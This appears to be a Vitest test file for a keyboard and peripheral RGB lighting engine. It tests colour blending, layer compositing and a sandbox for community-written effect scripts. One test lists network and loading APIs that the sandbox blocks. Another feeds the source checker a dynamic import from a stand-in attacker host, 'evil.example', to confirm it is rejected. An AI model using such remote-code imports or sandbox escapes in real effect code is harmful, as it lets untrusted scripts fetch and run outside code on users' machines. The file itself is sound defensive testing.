import { describe, expect, it } from "vitest";
import type { LightingLayer, LightingScene } from "@/core/types";
import { blend, blendChannel, hex, hsv, statusColor, STATUS_PALETTES } from "./color";
import { Compositor } from "./compositor";
import { BLOCKED_GLOBALS, checkSource, sandboxRuntime } from "./sandbox";
import { buildGeometry } from "./scene";
import { effectRegistry } from "./effects/registry";
import { getTemplate } from "@/core/devices/templates";
import type { SceneKey } from "./api";

const signals = { battery: {} };

function grid(n = 4): SceneKey[] {
  return Array.from({ length: n }, (_, i) => ({ id: `K${i}`, x: i + 0.5, y: 0.5, w: 1, h: 1, index: i, kind: "key" as const, device: "dev", definition: "def" }));
}

const layer = (id: string, effect: string, params: Record<string, unknown> = {}, extra: Partial<LightingLayer> = {}): LightingLayer => ({
  id,
  effect,
  params,
  blend: "normal",
  opacity: 1,
  enabled: true,
  ...extra,
});

function scene(layers: LightingLayer[], brightness = 1): LightingScene {
  return { layers, brightness, fps: 30 };
}

const px = (f: Float32Array, i: number) => [Math.round(f[i * 3]), Math.round(f[i * 3 + 1]), Math.round(f[i * 3 + 2])];

describe("colour helpers", () => {
  it("converts hsv and hex", () => {
    expect(hsv(0).map(Math.round)).toEqual([255, 0, 0]);
    expect(hsv(120).map(Math.round)).toEqual([0, 255, 0]);
    expect(hex("#ff8000")).toEqual([255, 128, 0]);
    expect(hex("#0f0")).toEqual([0, 255, 0]);
  });

  it("implements the blend modes", () => {
    expect(blendChannel("normal", 100, 50)).toBe(50);
    expect(blendChannel("add", 200, 100)).toBe(255);
    expect(blendChannel("multiply", 255, 128)).toBe(128);
    expect(blendChannel("multiply", 0, 255)).toBe(0);
    expect(blendChannel("screen", 0, 128)).toBe(128);
    expect(blendChannel("screen", 255, 0)).toBe(255);
    expect(blendChannel("max", 10, 200)).toBe(200);
    expect(blend("normal", [0, 0, 0], [200, 100, 50], 0.5)).toEqual([100, 50, 25]);
  });

  it("uses a CVD-safe status palette", () => {
    expect(statusColor("good", "deuteranopia")).toEqual(STATUS_PALETTES.deuteranopia.good);
    expect(statusColor("good", "normal")).not.toEqual(statusColor("good", "deuteranopia"));
  });
});

describe("compositor", () => {
  it("stacks layers with masks, blend modes, opacity and brightness", () => {
    const c = new Compositor();
    c.setGeometry(grid(), 4, 1);
    c.setScene(
      scene(
        [
          layer("a", "static", { color: "#202020" }),
          layer("b", "static", { color: "#ff0000" }, { mask: ["K1"] }),
          layer("c", "static", { color: "#0000ff" }, { mask: ["K2"], blend: "add", opacity: 0.5 }),
          layer("d", "static", { color: "#808080" }, { mask: ["K3"], blend: "multiply" }),
        ],
        1,
      ),
    );
    const f = c.render(1, 1 / 30, signals);
    expect(px(f, 0)).toEqual([32, 32, 32]);
    expect(px(f, 1)).toEqual([255, 0, 0]);
    expect(px(f, 2)).toEqual([32, 32, 144]); // add → 287 clipped to 255, then 50 % opacity over 32
    expect(px(f, 3)).toEqual([16, 16, 16]);

    c.setScene(scene([layer("a", "static", { color: "#ffffff" })], 0.5));
    expect(px(c.render(2, 1 / 30, signals), 0)).toEqual([128, 128, 128]);
  });

  it("filters layers by device", () => {
    const keys = grid();
    keys[3] = { ...keys[3], device: "mouse-1", definition: "razer-deathadder-v2-pro" };
    const c = new Compositor();
    c.setGeometry(keys, 4, 1);
    c.setScene(scene([layer("a", "static", { color: "#00ff00" }, { devices: ["razer-deathadder-v2-pro"] })]));
    const f = c.render(0, 0.03, signals);
    expect(px(f, 0)).toEqual([0, 0, 0]);
    expect(px(f, 3)).toEqual([0, 255, 0]);
  });

  it("applies overlays by priority (exclusive hides the scene)", () => {
    const c = new Compositor();
    c.setGeometry(grid(), 4, 1);
    c.setScene(scene([layer("a", "static", { color: "#ffffff" })]));
    const f = c.render(0, 0.03, signals, {
      overlays: [
        { priority: 10, colors: { K0: [0, 0, 255] }, exclusive: true },
        { priority: 1, colors: { K0: [255, 0, 0], K1: [255, 0, 0] } },
      ],
    });
    expect(px(f, 0)).toEqual([0, 0, 255]);
    expect(px(f, 1)).toEqual([0, 0, 0]); // hidden by the exclusive overlay above it
    expect(px(f, 2)).toEqual([0, 0, 0]);
  });

  it("smooths flashes when reduceFlashing is on", () => {
    const c = new Compositor();
    c.setGeometry(grid(1), 1, 1);
    c.setScene(scene([layer("a", "static", { color: "#000000" })]));
    c.render(0, 1 / 30, signals, { reduceFlashing: true });
    c.setScene(scene([layer("a", "static", { color: "#ffffff" })]));
    const f = c.render(1 / 30, 1 / 30, signals, { reduceFlashing: true });
    expect(f[0]).toBeGreaterThan(0);
    expect(f[0]).toBeLessThan(80); // a black → white step is spread over several frames
  });

  it("runs every built-in effect and widget without throwing", () => {
    const tpl = getTemplate("ansi-60");
    const geom = buildGeometry([{ uid: "kb", definition: { id: "kb", name: "kb", vendor: "x", type: "keyboard", match: [], driver: "razer", capabilities: {}, size: tpl.size, status: "experimental" }, layout: tpl.layout, desk: { x: 0, y: 0 } }]);
    const sig = {
      battery: { "kb:1": { percent: 20, charging: true } },
      cpu: { load: 50 },
      gpu: { load: 10, temp: 70, vramPct: 20 },
      ram: { pct: 40 },
      audio: { bands: new Array(16).fill(0.5), level: 0.5 },
      claude: { state: "working" as const, since: 0 },
      micMuted: true,
      capsLock: true,
      wpm: 90,
      layer: "nav",
      pomodoro: { phase: "focus" as const, remainingMs: 1000, totalMs: 2000 },
      game: { game: "cs2" as const, health: 50, ammo: 0.2 },
      bambu: { progress: 40, state: "RUNNING" },
    };
    for (const meta of effectRegistry.list().filter((m) => m.source === "builtin")) {
      const c = new Compositor({ onLayerError: (_id, msg) => expect.fail(`${meta.id}: ${msg}`) });
      c.setGeometry(geom.keys, geom.width, geom.height);
      c.setScene(scene([layer("x", meta.id)]));
      c.keyEvent("KeyA", true, 0.1);
      for (let i = 0; i < 20; i++) c.render(0.1 + i / 30, 1 / 30, sig);
      expect(Object.keys(c.errors)).toEqual([]);
    }
  });
});

// ---------------------------------------------------------------------------
// Sandbox (runtime exercised in-process with a fake worker scope)
// ---------------------------------------------------------------------------

function fakeWorker() {
  const messages: Record<string, unknown>[] = [];
  const scope = {
    postMessage: (m: unknown) => messages.push(m as Record<string, unknown>),
    onmessage: null as ((e: { data: unknown }) => void) | null,
  };
  sandboxRuntime(scope, BLOCKED_GLOBALS, 8);
  return { scope, messages, send: (data: unknown) => scope.onmessage!({ data }) };
}

describe("community effect sandbox", () => {
  const sources = import.meta.glob<string>("/community/effects/*.js", { query: "?raw", import: "default", eager: true });
  const files = Object.keys(sources).map((p) => p.split("/").pop()!);

  it("ships 4–6 example effects", () => {
    expect(files.length).toBeGreaterThanOrEqual(4);
    expect(files.length).toBeLessThanOrEqual(6);
  });

  for (const file of files) {
    it(`loads and renders ${file}`, () => {
      const source = sources[`/community/effects/${file}`];
      expect(checkSource(source)).toBeNull();
      const w = fakeWorker();
      w.send({ type: "load", source });
      const meta = w.messages.find((m) => m.type === "meta")?.meta as { id: string; params: Record<string, { default: unknown }> };
      expect(meta?.id).toBe(file.replace(/\.js$/, ""));
      const params = Object.fromEntries(Object.entries(meta.params).map(([k, v]) => [k, v.default]));
      w.send({ type: "create", params });
      const keys = grid(8).map((k) => ({ ...k, x: k.x * 2 }));
      w.send({ type: "geometry", keys, region: keys.map((k) => k.index) });
      w.send({ type: "key", event: { id: "K2", x: 5, y: 0.5, t: 0.5, down: true } });
      for (let i = 0; i < 30; i++) {
        w.send({ type: "frame", seq: i, ctx: { t: 0.5 + i / 30, dt: 1 / 30, width: 16, height: 1, masked: false, params, pressed: [], events: [], signals: {} } });
      }
      expect(w.messages.filter((m) => m.type === "error")).toEqual([]);
      const last = w.messages.filter((m) => m.type === "frame").pop()!;
      expect((last.rgb as Float32Array).length).toBe(24);
      expect([...(last.alpha as Float32Array)].some((a) => a > 0)).toBe(true);
    });
  }

  it("removes network and loading APIs before running effect code", () => {
    const source = `export default {
      meta: { id: "probe", name: "Probe", params: {} },
      create() {
        const blocked = [typeof fetch, typeof XMLHttpRequest, typeof importScripts, typeof WebSocket, typeof EventSource, typeof globalThis, typeof self];
        return { frame(ctx) { ctx.fill(blocked.every((t) => t === "undefined") ? [0, 255, 0] : [255, 0, 0]); } };
      },
    };`;
    const w = fakeWorker();
    w.send({ type: "load", source });
    w.send({ type: "create", params: {} });
    const keys = grid(1);
    w.send({ type: "geometry", keys, region: [0] });
    w.send({ type: "frame", seq: 1, ctx: { t: 0, dt: 0.03, width: 1, height: 1, masked: false, params: {}, pressed: [], events: [], signals: {} } });
    const f = w.messages.find((m) => m.type === "frame")!;
    expect([...(f.rgb as Float32Array)]).toEqual([0, 255, 0]);
  });

  it("rejects imports and reports runtime errors", () => {
    expect(checkSource(`import x from "y"; export default {}`)).toMatch(/import/);
    expect(checkSource(`export default { create() { return import("https://evil.example") } }`)).toMatch(/import/);
    expect(checkSource(`const a = 1;`)).toMatch(/export default/);
    const w = fakeWorker();
    w.send({ type: "load", source: `export default { meta: { id: "boom", name: "Boom", params: {} }, create() { return { frame() { throw new Error("kaboom"); } }; } };` });
    w.send({ type: "create", params: {} });
    w.send({ type: "geometry", keys: grid(1), region: [0] });
    w.send({ type: "frame", seq: 1, ctx: { t: 0, dt: 0.03, width: 1, height: 1, masked: false, params: {}, pressed: [], events: [], signals: {} } });
    expect(w.messages.find((m) => m.type === "error")?.message).toBe("kaboom");
  });
});
